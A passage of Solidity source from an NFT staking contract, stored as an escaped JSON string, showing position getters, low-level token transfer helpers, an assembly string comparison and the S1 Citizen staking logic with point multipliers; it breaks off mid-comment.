citizenDetails.timelockEndTime,\n\t\t\t\tpoints: citizenDetails.points,\n\t\t\t\thasVault: citizenDetails.hasVault,\n\t\t\t\tstakedVaultId: citizenDetails.stakedVaultId\n\t\t\t});\n\t\t\tunchecked { i++; }\n\t\t}\n\n\t\t// Compile the S2 Citizen details.\n\t\tStakedS2CitizenOutput[] memory stakedS2Details =\n\t\t\tnew StakedS2CitizenOutput[](_stakerS2Position[_staker].length);\n\t\tfor (uint256 i; i < _stakerS2Position[_staker].length; ) {\n\t\t\tuint256 citizenId = _stakerS2Position[_staker][i];\n\t\t\tStakedS2Citizen memory citizenDetails = stakedS2[_staker][citizenId];\n\t\t\tstakedS2Details[i] = StakedS2CitizenOutput({\n\t\t\t\tcitizenId: citizenId,\n\t\t\t\tstakedBytes: citizenDetails.stakedBytes,\n\t\t\t\ttimelockEndTime: citizenDetails.timelockEndTime,\n\t\t\t\tpoints: citizenDetails.points\n\t\t\t});\n\t\t\tunchecked { i++; }\n\t\t}\n\n\t\t// Return the final output position struct.\n\t\treturn StakerPosition({\n\t\t\tstakedS1Citizens: stakedS1Details,\n\t\t\tstakedS2Citizens: stakedS2Details,\n\t\t\tstakedLPPosition: stakerLPPosition[_staker]\n\t\t});\n\t}\n\n\t/**\n\t\tA private helper function for performing the low-level call to \n\t\t`transferFrom` on either a specific ERC-721 token or some amount of ERC-20 \n\t\ttokens.\n\n\t\t@param _asset The address of the asset to perform the transfer call on.\n\t\t@param _from The address to attempt to transfer the asset from.\n\t\t@param _to The address to attempt to transfer the asset to.\n\t\t@param _idOrAmount This parameter encodes either an ERC-721 token ID or an \n\t\t\tamount of ERC-20 tokens to attempt to transfer, depending on what \n\t\t\tinterface is implemented by `_asset`.\n\t*/\n\tfunction _assetTransferFrom (\n\t\taddress _asset,\n\t\taddress _from,\n\t\taddress _to,\n\t\tuint256 _idOrAmount\n\t) private {\n\t\t(bool success, bytes memory data) = \n\t\t\t_asset.call(\n\t\t\t\tabi.encodeWithSelector(\n\t\t\t\t\t_TRANSFER_FROM_SELECTOR,\n\t\t\t\t\t_from,\n\t\t\t\t\t_to, \n\t\t\t\t\t_idOrAmount\n\t\t\t\t)\n\t\t\t);\n\n\t\t// Revert if the low-level call fails.\n\t\tif (!success) {\n\t\t\trevert(string(data));\n\t\t}\n\t}\n\n\t/**\n\t\tA private helper function for performing the low-level call to `transfer` \n\t\ton some amount of ERC-20 tokens.\n\n\t\t@param _asset The address of the asset to perform the transfer call on.\n\t\t@param _to The address to attempt to transfer the asset to.\n\t\t@param _amount The amount of ERC-20 tokens to attempt to transfer.\n\t*/\n\tfunction _assetTransfer (\n\t\taddress _asset,\n\t\taddress _to,\n\t\tuint256 _amount\n\t) private {\n\t\t(bool success, bytes memory data) = \n\t\t\t_asset.call(\n\t\t\t\tabi.encodeWithSelector(\n\t\t\t\t\t_TRANSFER_SELECTOR,\n\t\t\t\t\t_to, \n\t\t\t\t\t_amount\n\t\t\t\t)\n\t\t\t);\n\n\t\t// Revert if the low-level call fails.\n\t\tif (!success) {\n\t\t\trevert(string(data));\n\t\t}\n\t}\n\n\t/**\n\t\tA private helper for checking equality between two strings.\n\n\t\t@param _a The first string to compare.\n\t\t@param _b The second string to compare.\n\n\t\t@return Whether or not `_a` and `_b` are equal.\n\t*/\n\tfunction _stringEquals (\n\t\tstring memory _a,\n\t\tstring memory _b\n\t) private pure returns (bool) {\n\t\tbytes memory a = bytes(_a);\n\t\tbytes memory b = bytes(_b);\n\t\t\n\t\t// Check equivalence of the two strings by comparing their contents.\n\t\tbool equal = true;\n\t\tassembly {\n\t\t\tlet length := mload(a)\n\t\t\tswitch eq(length, mload(b))\n\n\t\t\t// Proceed to compare string contents if lengths are equal. \n\t\t\tcase 1 {\n\t\t\t\tlet cb := 1\n\n\t\t\t\t// Iterate through the strings and compare contents.\n\t\t\t\tlet mc := add(a, 0x20)\n\t\t\t\tlet end := add(mc, length)\n\t\t\t\tfor {\n\t\t\t\t\tlet cc := add(b, 0x20)\n\t\t\t\t} eq(add(lt(mc, end), cb), 2) {\n\t\t\t\t\tmc := add(mc, 0x20)\n\t\t\t\t\tcc := add(cc, 0x20)\n\t\t\t\t} {\n\n\t\t\t\t\t// If any of these checks fails then arrays are not equal.\n\t\t\t\t\tif iszero(eq(mload(mc), mload(cc))) {\n\t\t\t\t\t\tequal := 0\n\t\t\t\t\t\tcb := 0\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// By default the array length is not equal so the strings are not equal.\n\t\t\tdefault {\n\t\t\t\tequal := 0\n\t\t\t}\n\t\t}\n\t\treturn equal;\n\t}\n\n\t/**\n\t\tA private helper function for managing the staking of a particular S1 \n\t\tCitizen. S1 Citizens may optionally be staked at the same time as a Vault, \n\t\tif they do not already contain a Vault.\n\n\t\t@param _timelock The selected timelock option for the asset being staked. \n\t\t\tThis encodes the timelock duration and multiplier.\n\t*/\n\tfunction _stakeS1Citizen (\n\t\tuint256 _timelock\n\t) private {\n\t\tuint256 citizenId;\n\t\tuint256 vaultId;\n\t\tuint256 handClaimant;\n\n\t\t/*\n\t\t\tExtract the S1 Citizen ID, optional Vault token ID, and optional Hand \n\t\t\tclaimant ID from calldata.\n\t\t*/\n\t\tassembly {\n\t\t\tcitizenId := calldataload(0x44)\n\t\t\tvaultId := calldataload(0x64)\n\t\t\thandClaimant := calldataload(0x84)\n\t\t}\n\n\t\t/*\n\t\t\tAttempt to transfer the S1 Citizen to be held in escrow by this staking \n\t\t\tcontract. This transfer will fail if the caller is not the holder of the \n\t\t\tCitizen. This prevents double staking.\n\t\t*/\n\t\t_assetTransferFrom(S1_CITIZEN, msg.sender, address(this), citizenId);\n\n\t\t// Retrieve storage for tracking the staking state of this S1 Citizen.\n\t\tStakedS1Citizen storage citizenStatus = stakedS1[msg.sender][citizenId];\n\n\t\t// Attach a getter to the S1 Citizen and check for a component Vault.\n\t\tIGenericGetter citizen = IGenericGetter(S1_CITIZEN);\n\t\tuint256 citizenVaultId = citizen.getVaultIdOfTokenId(citizenId);\n\n\t\t/*\n\t\t\tA new Vault to stake may only be provided if the S1 Citizen being staked \n\t\t\tdoes not already have a component Vault.\n\t\t*/\n\t\tif (citizenVaultId != 0 && vaultId != 0) {\n\t\t\trevert CitizenAlreadyHasVault(citizenVaultId, vaultId);\n\n\t\t/*\n\t\t\tIf no optional vault is provided, and the S1 Citizen being staked already \n\t\t\thas an existing Vault, override the provided `vaultId`.\n\t\t*/\n\t\t} else if (citizenVaultId != 0 && vaultId == 0) {\n\t\t\tcitizenStatus.hasVault = true;\n\t\t\tvaultId = citizenVaultId;\n\n\t\t/*\n\t\t\tOtherwise, if the S1 Citizen has no component Vault, the newly-provided \n\t\t\tVault is staked and the S1 Citizen is recorded as carrying an optional, \n\t\t\tseparately-attached vault.\n\t\t*/\n\t\t} else if (citizenVaultId == 0 && vaultId != 0) {\n\t\t\t_assetTransferFrom(VAULT, msg.sender, address(this), vaultId);\n\t\t\tcitizenStatus.hasVault = true;\n\t\t\tcitizenStatus.stakedVaultId = vaultId;\n\t\t}\n\n\t\t/*\n\t\t\tIf the S1 Citizen contains no component Vault and is not staked alongside \n\t\t\tan optional Vault (`citizenVaultId` == 0 && `vaultId` == 0), we need not \n\t\t\tdo anything to change the initial state of a staked S1 Citizen's Vault.\n\t\t*/\n\n\t\t// Determine the base worth in points of the S1 Citizen's Identity.\n\t\tstring memory citizenCreditYield = getCreditYield(\n\t\t\tcitizenId,\n\t\t\tcitizenVaultId\n\t\t);\n\t\tuint256 identityPoints = identityCreditPoints[citizenCreditYield];\n\n\t\t// Hands of the Citadel are always given the same multiplier as '?' Vaults.\n\t\tuint256 vaultMultiplier = 100;\n\t\tif (handClaimant == 1) {\n\t\t\tuint256 identityId = citizen.getIdentityIdOfTokenId(citizenId);\n\t\t\tstring memory class = IGenericGetter(IDENTITY).getClass(identityId);\n\t\t\tif (_stringEquals(class, \"Hand of Citadel\")) {\n\t\t\t\tvaultMultiplier = vaultCreditMultiplier[\"?\"];\n\t\t\t} else {\n\t\t\t\trevert CitizenIsNotHand(citizenId);\n\t\t\t}\n\n\t\t// Otherwise use the configured Vault multiplier, if any.\n\t\t} else if (vaultId != 0) {\n\t\t\tvaultMultiplier = getConfiguredVaultMultiplier(vaultId);\n\t\t}\n\n\t\t// Decode the timelock option's duration and multiplier.\n\t\tuint256 timelockDuration = _timelock >> 128;\n\t\tuint256 timelockMultiplier = _timelock & type(uint128).max;\n\n\t\t// Update caller staking information and asset data.\n\t\tPoolData storage pool = _pools[AssetType.S1_CITIZEN];\n\t\tunchecked {\n\t\t\tcitizenStatus.points =\n\t\t\t\tidentityPoints * vaultMultiplier * timelockMultiplier /\n\t\t\t\t_DIVISOR / _DIVISOR;\n\t\t\tcitizenStatus.timelockEndTime = block.timestamp + timelockDuration;\n\n\t\t\t// Record the caller's staked S1 Citizen.\n\t\t\t_stakerS1Position[msg.sender].push(citizenId);\n\n\t\t\t// Update the pool point weights for rewards\n\t\t\tpool.totalPoints += citizenStatus.points;\n\t\t}\n\n\t\t// Emit an event recording this S1 Citizen staking.\n\t\temit Stake(\n\t\t\tmsg.sender,\n\t\t\tS1_CITIZEN,\n\t\t\t_timelock,\n\t\t\tcitizenId\n\t\t);\n\t}\n\n\t/**\n\t\tA private func"
    }
  ]
}